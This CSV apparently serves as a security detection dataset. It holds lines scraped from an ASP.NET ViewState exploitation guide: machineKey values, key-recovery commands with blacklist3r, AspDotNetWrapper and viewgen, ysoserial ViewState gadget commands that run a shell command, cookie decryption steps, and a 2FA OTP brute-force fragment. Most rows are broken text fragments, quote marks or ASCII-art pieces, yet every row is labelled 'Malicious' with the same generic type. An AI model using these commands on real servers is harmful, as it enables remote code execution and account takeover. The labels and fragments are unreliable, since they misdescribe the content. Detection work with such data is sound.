Payload,Signature,AttackType,Severity,MITRE,Label,Description
"<machineKey validationKey=""[String]""  decryptionKey=""[String]"" validation=""[SHA1 (default) | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]""  decryption=""[Auto (default) | DES | 3DES | AES | alg:algorithm_name]"" />",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<machineKey validationKey=""87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC"" decryptionKey=""E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7"" validation=""SHA1"" />",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
____   ____.__                       __         .__   __,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
\   \ /   /|__| ______  _  _________/  |______  |  | |  | __ ___________,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
\   Y   / |  |/ __ \ \/ \/ /  ___/\   __\__  \ |  | |  |/ // __ \_  __ \,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
\     /  |  \  ___/\     /\___ \  |  |  / __ \|  |_|    <\  ___/|  | \/,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
\___/   |__|\___  >\/\_//____  > |__| (____  /____/__|_ \\___  >__|,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
\/           \/            \/          \/    \/,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
KEY FOUND!!!,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
Host:,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"Validation Key: XXXXX,XXXXX",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
Matching MachineKeys found!,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE validationAlgo: SHA1,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"$ viewgen --guess ""/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI=""",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
[+] ViewState is not encrypted,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
[+] Signature algorithm: SHA1,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"viewgen --decode --check --webconfig web.config --modifier CA0B0334 ""zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=""",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
# --modifier = `__VIEWSTATEGENERATOR` parameter value,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
# --encrypteddata = `__VIEWSTATE` parameter value of the target application,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
# --generator = `__VIEWSTATEGENERATOR` parameter value,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
# --validationkey = validation key from the previous command,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
".\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c ""echo 123 > c:\windows\temp\test.txt"" --apppath=""/testaspx/"" --islegacy --validationalg=""SHA1"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"" --isdebug",Generic Payload,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from comprehensive dataset
".\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c ""echo 123 > c:\windows\temp\test.txt"" --path=""/somepath/testaspx/test.aspx"" --apppath=""/testaspx/"" --decryptionalg=""AES"" --decryptionkey=""34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887"" --validationalg=""HMACSHA256"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0""",Generic Payload,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from comprehensive dataset
# decrypt cookie,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
# encrypt cookie (edit Decrypted.txt),Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
EnableViewStateMac=False,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
ViewStateEncryptionMode=False,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
EnableViewStateMac=True,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
ViewStateEncryptionMode=True,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
enableViewStateMac,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
False,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
/wEP,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"The """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"The """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"The """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"The """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    * """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    * """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    * """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    * """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    * """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"* """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
* Find the machine key (validationkey) using ",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
 or ,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    # --modifier = """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    # --encrypteddata = """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
 and ,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"Default validation algorithm is """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
 and the default decryption algorithm is ,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"If the """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
" is missing but the application uses .NET Framework version 4.0 or below, you can use the root of the app (e.g: ",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
* **.NET Framework < 4.5**," ASP.NET always accepts an unencrypted """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
 if you remove the ,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from comprehensive dataset
* **.NET Framework > 4.5**," the machineKey has the property: """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"    """,Generic Payload,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from comprehensive dataset
"If you have the """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
{,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
""otp"""":[""",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"""1234"",",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"""1111"",",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"""1337"", // GOOD OTP",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"""2222"",",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"""3333"",",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"""4444"",",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"""5555""",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
],Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
},Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"""success"":false",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"""success"":true",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
/my-account,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
/2fa/verify,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
/my-account,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
